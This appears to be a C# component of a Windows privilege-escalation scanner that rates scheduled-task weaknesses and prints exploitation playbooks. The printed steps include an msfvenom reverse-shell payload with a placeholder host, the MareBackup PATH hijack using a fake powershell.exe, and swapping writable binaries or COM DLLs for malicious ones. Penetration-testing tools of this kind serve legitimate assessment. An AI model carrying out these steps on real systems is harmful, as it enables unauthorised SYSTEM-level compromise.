using System;
using System.Collections.Generic;
using System.Linq;

namespace TaskPrivEscScanner
{
    public class FindingsAnalyzer
    {
        private readonly List<TaskFinding> _findings;
        private readonly Dictionary<Severity, List<TaskFinding>> _categorized;
        
        public FindingsAnalyzer(List<TaskFinding> findings)
        {
            _findings = findings;
            _categorized = new Dictionary<Severity, List<TaskFinding>>
            {
                { Severity.Critical, new List<TaskFinding>() },
                { Severity.High, new List<TaskFinding>() },
                { Severity.Medium, new List<TaskFinding>() },
                { Severity.Low, new List<TaskFinding>() }
            };
        }
        
        public void Analyze()
        {
            foreach (var finding in _findings)
            {
                DetermineSeverity(finding);
                GenerateExploitSteps(finding);
                
                _categorized[finding.Severity].Add(finding);
            }
        }
        
        private void DetermineSeverity(TaskFinding finding)
        {
            // Check for MareBackup task with writable PATH - CRITICAL
            bool isMareBackupTask = finding.TaskName.Equals("MareBackup", StringComparison.OrdinalIgnoreCase) ||
                                    finding.TaskPath.Contains("MareBackup") ||
                                    finding.Actions.Any(a => a.Path.Contains("compattelrunner.exe"));
            
            if (isMareBackupTask && EnvironmentChecks.HasWritableSystemPath)
            {
                finding.Severity = Severity.Critical;
                finding.Issues.Add("MAREBACKUP PRIVESC: CompatTelRunner.exe spawns powershell.exe without absolute path");
                finding.Issues.Add("Windows uses executable search order which includes PATH directories");
                finding.Issues.Add("Writable SYSTEM PATH directory found - place malicious powershell.exe there");
                finding.Issues.Add("Reference: https://itm4n.github.io/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/");
                finding.IsMareBackupWithWritablePath = true;
                return;
            }
            
            // Check for critical issues (writable/missing binaries or COM servers)
            foreach (var action in finding.Actions)
            {
                // Exec action checks
                if (action.ActionType == "Exec")
                {
                    if (action.BinaryWritable)
                    {
                        finding.Severity = Severity.Critical;
                        finding.Issues.Add($"Binary is WRITABLE by {action.WritableBy}: {action.Path}");
                        return;
                    }
                    
                    if (!action.BinaryExists && action.ParentDirWritable)
                    {
                        finding.Severity = Severity.Critical;
                        finding.Issues.Add($"Binary MISSING and parent dir writable by {action.WritableBy}: {action.Path}");
                        return;
                    }
                    
                    if (!action.BinaryExists)
                    {
                        finding.Issues.Add($"Binary missing (check parent permissions manually): {action.Path}");
                    }
                }
                // COM Handler checks
                else if (action.ActionType == "ComHandler")
                {
                    if (action.ComDllWritable)
                    {
                        finding.Severity = Severity.Critical;
                        finding.Issues.Add($"COM Server DLL is WRITABLE by {action.ComDllWritableBy}: {action.ComServerPath}");
                        return;
                    }
                    
                    if (action.ComDllMissing && action.ComDllParentWritable)
                    {
                        finding.Severity = Severity.Critical;
                        finding.Issues.Add($"COM Server DLL MISSING and parent dir writable by {action.ComDllWritableBy}: {action.ComServerPath}");
                        return;
                    }
                    
                    if (action.ComDllMissing)
                    {
                        finding.Issues.Add($"COM Server DLL missing: {action.ComServerPath}");
                    }
                }
            }
            
            // MareBackup without writable PATH is still HIGH (potential UAC bypass)
            if (isMareBackupTask && finding.RunsAsSystem)
            {
                finding.Severity = Severity.High;
                finding.Issues.Add("MAREBACKUP: CompatTelRunner.exe spawns powershell.exe without absolute path");
                finding.Issues.Add("No writable SYSTEM PATH found - requires finding/creating writable PATH entry");
                finding.Issues.Add("May be exploitable for UAC bypass if PATH can be modified");
                finding.Issues.Add("Reference: https://itm4n.github.io/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/");
                finding.IsMareBackupTask = true;
                return;
            }
            
            // High: SYSTEM tasks
            if (finding.RunsAsSystem)
            {
                finding.Severity = Severity.High;
                finding.Issues.Add("Task runs as SYSTEM and can be triggered by low-priv users");
                return;
            }
            
            // Medium: Admin or Elevated
            if (finding.RunsAsAdmin || finding.RunsElevated)
            {
                finding.Severity = Severity.Medium;
                if (finding.RunsAsAdmin)
                    finding.Issues.Add("Task runs as Administrator");
                if (finding.RunsElevated)
                    finding.Issues.Add("Task runs with elevated privileges (HighestAvailable)");
                return;
            }
            
            finding.Severity = Severity.Low;
            finding.Issues.Add("Task has permissive ACLs");
        }
        
        private void GenerateExploitSteps(TaskFinding finding)
        {
            var steps = new List<string>();
            
            // MareBackup with writable PATH - specific exploitation
            if (finding.IsMareBackupWithWritablePath)
            {
                var writablePath = EnvironmentChecks.WritablePaths.Find(p => p.IsSystemPath);
                if (writablePath != null)
                {
                    steps.Add("=== MAREBACKUP PRIVILEGE ESCALATION ===");
                    steps.Add("");
                    steps.Add("CompatTelRunner.exe spawns powershell.exe WITHOUT specifying the absolute path.");
                    steps.Add("Windows uses the standard executable search order, which includes PATH directories.");
                    steps.Add("");
                    steps.Add("IMPORTANT: The writable PATH directory must appear BEFORE");
                    steps.Add("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ in the search order!");
                    steps.Add("");
                    steps.Add($"1. Writable PATH directory found: {writablePath.Path}");
                    steps.Add($"   Writable by: {writablePath.WritableBy}");
                    steps.Add("");
                    steps.Add("2. Check PATH order (writable dir must come BEFORE PowerShell path):");
                    steps.Add("   reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v Path");
                    steps.Add("");
                    steps.Add("3. Create malicious powershell.exe payload:");
                    steps.Add("   Option A: Reverse shell");
                    steps.Add("     msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o powershell.exe");
                    steps.Add("");
                    steps.Add("   Option B: Spawn SYSTEM console (recommended, uses SeTcbPrivilege)");
                    steps.Add("     Compile C code that calls CreateProcessAsUserW to spawn cmd.exe on user desktop");
                    steps.Add("     Reference: https://googleprojectzero.blogspot.com/2016/01/raising-dead.html");
                    steps.Add("");
                    steps.Add($"4. Place payload: copy powershell.exe \"{writablePath.Path}\\powershell.exe\"");
                    steps.Add("");
                    steps.Add("5. Enable task if needed:");
                    steps.Add("   Enable-ScheduledTask -TaskPath \"\\Microsoft\\Windows\\Application Experience\" -TaskName \"MareBackup\"");
                    steps.Add("");
                    steps.Add($"6. Trigger task: schtasks /run /tn \"{finding.TaskPath}\"");
                    steps.Add("   Or: Start-ScheduledTask -TaskPath \"\\Microsoft\\Windows\\Application Experience\" -TaskName \"MareBackup\"");
                    steps.Add("");
                    steps.Add("7. Your powershell.exe executes as NT AUTHORITY\\SYSTEM");
                    steps.Add("");
                    steps.Add($"8. Cleanup: del \"{writablePath.Path}\\powershell.exe\"");
                    steps.Add("");
                    steps.Add("References:");
                    steps.Add("   - https://itm4n.github.io/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/");
                    steps.Add("   - https://blog.scrt.ch/2025/05/20/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/");
                }
                finding.ExploitSteps = steps;
                return;
            }
            
            // MareBackup without writable PATH (potential UAC bypass)
            if (finding.IsMareBackupTask)
            {
                steps.Add("=== MAREBACKUP TASK (NO WRITABLE SYSTEM PATH) ===");
                steps.Add("");
                steps.Add("CompatTelRunner.exe spawns powershell.exe without absolute path.");
                steps.Add("Exploitation requires a writable directory PREPENDED to SYSTEM PATH.");
                steps.Add("");
                steps.Add("Current status: No writable SYSTEM PATH directory found.");
                steps.Add("");
                steps.Add("Potential exploitation paths:");
                steps.Add("1. Check if you can modify SYSTEM PATH (requires admin, but useful for UAC bypass)");
                steps.Add("2. Look for software that adds writable directories to PATH during installation");
                steps.Add("3. Check for other scheduled tasks with similar behavior");
                steps.Add("");
                steps.Add("To check PATH order:");
                steps.Add("   reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v Path");
                steps.Add("");
                steps.Add("References:");
                steps.Add("   - https://itm4n.github.io/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/");
                steps.Add("   - https://blog.scrt.ch/2025/05/20/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/");
                finding.ExploitSteps = steps;
                return;
            }
            
            // Check for critical Exec actions
            var critExecAction = finding.Actions.FirstOrDefault(a => 
                a.ActionType == "Exec" && (a.BinaryWritable || (!a.BinaryExists && a.ParentDirWritable)));
            
            // Check for critical COM handler actions
            var critComAction = finding.Actions.FirstOrDefault(a => 
                a.ActionType == "ComHandler" && (a.ComDllWritable || (a.ComDllMissing && a.ComDllParentWritable)));
            
            if (critExecAction != null)
            {
                if (critExecAction.BinaryWritable)
                {
                    steps.Add($"1. Backup original binary: copy \"{critExecAction.Path}\" \"{critExecAction.Path}.bak\"");
                    steps.Add($"2. Replace with payload: copy payload.exe \"{critExecAction.Path}\"");
                }
                else
                {
                    steps.Add($"1. Create malicious binary: copy payload.exe \"{critExecAction.Path}\"");
                }
                
                steps.Add($"3. Trigger task: schtasks /run /tn \"{finding.TaskPath}\"");
                steps.Add($"4. Payload executes as: {finding.PrivilegeContext}");
                
                if (critExecAction.BinaryWritable)
                {
                    steps.Add($"5. Restore original: copy \"{critExecAction.Path}.bak\" \"{critExecAction.Path}\"");
                }
            }
            else if (critComAction != null)
            {
                if (critComAction.ComDllWritable)
                {
                    steps.Add($"1. Backup original DLL: copy \"{critComAction.ComServerPath}\" \"{critComAction.ComServerPath}.bak\"");
                    steps.Add($"2. Create malicious DLL with same exports (use DLL proxy/hijack template)");
                    steps.Add($"3. Replace DLL: copy malicious.dll \"{critComAction.ComServerPath}\"");
                }
                else
                {
                    steps.Add($"1. Create malicious DLL: copy malicious.dll \"{critComAction.ComServerPath}\"");
                }
                
                steps.Add($"4. Trigger task: schtasks /run /tn \"{finding.TaskPath}\"");
                steps.Add($"5. DLL loaded as: {finding.PrivilegeContext}");
                
                if (critComAction.ComDllWritable)
                {
                    steps.Add($"6. Restore original: copy \"{critComAction.ComServerPath}.bak\" \"{critComAction.ComServerPath}\"");
                }
            }
            else if (finding.RunsAsSystem)
            {
                // Get unique binary paths to avoid duplicates
                var uniqueExecPaths = finding.Actions
                    .Where(a => a.ActionType == "Exec" && !string.IsNullOrEmpty(a.Path))
                    .Select(a => Environment.ExpandEnvironmentVariables(a.Path))
                    .Distinct()
                    .ToList();
                
                var comActions = finding.Actions.Where(a => a.ActionType == "ComHandler").ToList();
                
                if (uniqueExecPaths.Count > 0)
                {
                    steps.Add("1. Analyze binary for DLL hijacking:");
                    foreach (var path in uniqueExecPaths)
                    {
                        steps.Add($"   - Check imports: dumpbin /imports \"{path}\"");
                    }
                    steps.Add($"   - Monitor with: procmon /backingfile dllhijack.pml");
                    steps.Add($"2. If DLL hijack found, place malicious DLL in search path");
                }
                else if (comActions.Count > 0)
                {
                    steps.Add("1. Analyze COM handler for hijacking:");
                    foreach (var action in comActions)
                    {
                        steps.Add($"   - CLSID: {action.ComClassId}");
                        if (!string.IsNullOrEmpty(action.ComServerPath))
                            steps.Add($"   - Server: {action.ComServerPath}");
                    }
                    steps.Add($"   - Check for phantom DLL loading with procmon");
                }
                
                steps.Add($"3. Trigger task: schtasks /run /tn \"{finding.TaskPath}\"");
                steps.Add($"4. DLL loaded as: {finding.PrivilegeContext}");
            }
            else
            {
                steps.Add($"1. Query task details: schtasks /query /tn \"{finding.TaskPath}\" /v /fo list");
                steps.Add("2. Analyze execution chain for weaknesses");
                steps.Add($"3. If exploitable, trigger: schtasks /run /tn \"{finding.TaskPath}\"");
            }
            
            finding.ExploitSteps = steps;
        }
        
        public void PrintResults()
        {
           //PrintSeverityLegend();
            // Print by severity
            foreach (var severity in new[] { Severity.Critical, Severity.High, Severity.Medium, Severity.Low })
            {
                var findings = _categorized[severity];
                if (findings.Count == 0)
                    continue;
                
                var info = SeverityDescriptions.Info[severity];
                
                ConsoleHelper.PrintHeader($"{info.Name} FINDINGS ({findings.Count})", info.Color);
                
                foreach (var finding in findings)
                {
                    PrintFinding(finding, info.Color);
                }
            }
            
            PrintSummary();
        }
        
        public void PrintSeverityLegend()
        {
            ConsoleHelper.PrintHeader("SEVERITY LEGEND", ConsoleColor.White);
            
            foreach (var severity in new[] { Severity.Critical, Severity.High, Severity.Medium, Severity.Low })
            {
                var info = SeverityDescriptions.Info[severity];
                
                ConsoleHelper.WriteColored($"  [{info.Name}]", info.Color);
                Console.WriteLine($" {info.Description}");
                Console.WriteLine();
                
                // Explanation
                ConsoleHelper.WriteLineColored("    What it means:", ConsoleColor.Gray);
                foreach (var line in info.Explanation.Split('\n'))
                {
                    Console.WriteLine($"    {line}");
                }
                Console.WriteLine();
                
                // Exploitation
                ConsoleHelper.WriteLineColored("    How to exploit:", ConsoleColor.Gray);
                foreach (var line in info.Exploitation.Split('\n'))
                {
                    Console.WriteLine($"    {line}");
                }
                Console.WriteLine();
                Console.WriteLine(new string('-', 80));
            }
        }
        
        private void PrintFinding(TaskFinding finding, ConsoleColor headerColor)
        {
            ConsoleHelper.PrintSubHeader(finding.TaskPath);
            
            // Basic Info
            ConsoleHelper.PrintKeyValue("Task Name", finding.TaskName, ConsoleColor.White);
            ConsoleHelper.PrintKeyValue("Task Folder", finding.TaskFolder, ConsoleColor.Gray);
            ConsoleHelper.PrintKeyValue("State", finding.TaskState, 
                finding.TaskState == "Ready" ? ConsoleColor.Green : ConsoleColor.DarkGray);
            
            Console.WriteLine();
            
            // Privilege Context
            ConsoleHelper.PrintKeyValue("Run As", finding.RunAsUser, ConsoleColor.Yellow);
            ConsoleHelper.PrintKeyValue("Privilege Level", finding.PrivilegeContext, 
                finding.RunsAsSystem ? ConsoleColor.Red : ConsoleColor.Yellow);
            
            Console.WriteLine();
            
            // Who can start
            ConsoleHelper.WriteLineColored("    Startable By:", ConsoleColor.Cyan);
            foreach (var principal in finding.StartableBy)
            {
                Console.WriteLine($"      - {principal}");
            }
            
            Console.WriteLine();
            
            // Actions
            ConsoleHelper.WriteLineColored("    Actions:", ConsoleColor.Cyan);
            foreach (var action in finding.Actions)
            {
                if (action.ActionType == "Exec")
                {
                    ConsoleColor pathColor = ConsoleColor.White;
                    string status = "";
                    
                    if (action.BinaryWritable)
                    {
                        pathColor = ConsoleColor.Red;
                        status = " [WRITABLE]";
                    }
                    else if (!action.BinaryExists && action.ParentDirWritable)
                    {
                        pathColor = ConsoleColor.Red;
                        status = " [MISSING - PARENT WRITABLE]";
                    }
                    else if (!action.BinaryExists)
                    {
                        pathColor = ConsoleColor.Yellow;
                        status = " [MISSING]";
                    }
                    
                    Console.Write("      [Exec] Path: ");
                    ConsoleHelper.WriteColored(action.Path, pathColor);
                    if (!string.IsNullOrEmpty(status))
                    {
                        ConsoleHelper.WriteColored(status, pathColor);
                    }
                    Console.WriteLine();
                    
                    if (!string.IsNullOrEmpty(action.Arguments))
                    {
                        Console.WriteLine($"             Args: {action.Arguments}");
                    }
                    
                    if (!string.IsNullOrEmpty(action.WritableBy))
                    {
                        ConsoleHelper.WriteColored($"             Writable By: {action.WritableBy}\n", ConsoleColor.Magenta);
                    }
                }
                else if (action.ActionType == "ComHandler")
                {
                    ConsoleColor clsidColor = ConsoleColor.Cyan;
                    string status = "";
                    
                    if (action.ComDllWritable)
                    {
                        clsidColor = ConsoleColor.Red;
                        status = " [DLL WRITABLE]";
                    }
                    else if (action.ComDllMissing && action.ComDllParentWritable)
                    {
                        clsidColor = ConsoleColor.Red;
                        status = " [DLL MISSING - PARENT WRITABLE]";
                    }
                    else if (action.ComDllMissing)
                    {
                        clsidColor = ConsoleColor.Yellow;
                        status = " [DLL MISSING]";
                    }
                    
                    Console.Write("      [COM Handler] CLSID: ");
                    ConsoleHelper.WriteColored(action.ComClassId, clsidColor);
                    if (!string.IsNullOrEmpty(status))
                    {
                        ConsoleHelper.WriteColored(status, clsidColor);
                    }
                    Console.WriteLine();
                    
                    if (!string.IsNullOrEmpty(action.ComProgId))
                    {
                        Console.WriteLine($"                    ProgID: {action.ComProgId}");
                    }
                    
                    if (!string.IsNullOrEmpty(action.ComServerPath))
                    {
                        Console.WriteLine($"                    Server: {action.ComServerPath}");
                    }
                    
                    if (!string.IsNullOrEmpty(action.ComServerType))
                    {
                        Console.WriteLine($"                    Type:   {action.ComServerType}");
                    }
                    
                    if (!string.IsNullOrEmpty(action.ComData))
                    {
                        Console.WriteLine($"                    Data:   {action.ComData}");
                    }
                    
                    if (!string.IsNullOrEmpty(action.ComDllWritableBy))
                    {
                        ConsoleHelper.WriteColored($"                    Writable By: {action.ComDllWritableBy}\n", ConsoleColor.Magenta);
                    }
                }
            }
            
            Console.WriteLine();
            
            // Issues
            ConsoleHelper.WriteLineColored("    Issues:", ConsoleColor.Yellow);
            foreach (var issue in finding.Issues)
            {
                Console.WriteLine($"      ! {issue}");
            }
            
            Console.WriteLine();
            
            // Commands
            ConsoleHelper.WriteLineColored("    Commands:", ConsoleColor.Green);
            ConsoleHelper.PrintBox(new[]
            {
                "Start Task:",
                $"  {finding.StartCommand}",
                "",
                "Query Details:",
                $"  {finding.InfoCommand}"
            });
            
            Console.WriteLine();
            
            // Exploitation Steps
            ConsoleHelper.WriteLineColored("    Exploitation Steps:", ConsoleColor.Red);
            foreach (var step in finding.ExploitSteps)
            {
                Console.WriteLine($"      {step}");
            }
            
            Console.WriteLine();
        }
        
        private void PrintSummary()
        {
            ConsoleHelper.PrintHeader("SUMMARY", ConsoleColor.White);
            
            var crit = _categorized[Severity.Critical].Count;
            var high = _categorized[Severity.High].Count;
            var med = _categorized[Severity.Medium].Count;
            var low = _categorized[Severity.Low].Count;
            
            Console.WriteLine();
            ConsoleHelper.WriteColored("    CRITICAL : ", ConsoleColor.Red);
            ConsoleHelper.WriteLineColored(crit.ToString().PadLeft(3), crit > 0 ? ConsoleColor.Red : ConsoleColor.Green);
            
            ConsoleHelper.WriteColored("    HIGH     : ", ConsoleColor.Yellow);
            ConsoleHelper.WriteLineColored(high.ToString().PadLeft(3), high > 0 ? ConsoleColor.Yellow : ConsoleColor.Green);
            
            ConsoleHelper.WriteColored("    MEDIUM   : ", ConsoleColor.DarkYellow);
            ConsoleHelper.WriteLineColored(med.ToString().PadLeft(3), med > 0 ? ConsoleColor.DarkYellow : ConsoleColor.Green);
            
            ConsoleHelper.WriteColored("    LOW      : ", ConsoleColor.Cyan);
            ConsoleHelper.WriteLineColored(low.ToString().PadLeft(3), ConsoleColor.Cyan);
            
            Console.WriteLine("    " + new string('-', 15));
            Console.WriteLine($"    TOTAL    : {_findings.Count,3}");
            Console.WriteLine();
            
            if (crit > 0)
            {
                ConsoleHelper.WriteLineColored("    [!] CRITICAL findings require immediate attention!", ConsoleColor.Red);
                ConsoleHelper.WriteLineColored("        Direct privilege escalation is possible.", ConsoleColor.Red);
            }
            
            Console.WriteLine();
        }
    }
}
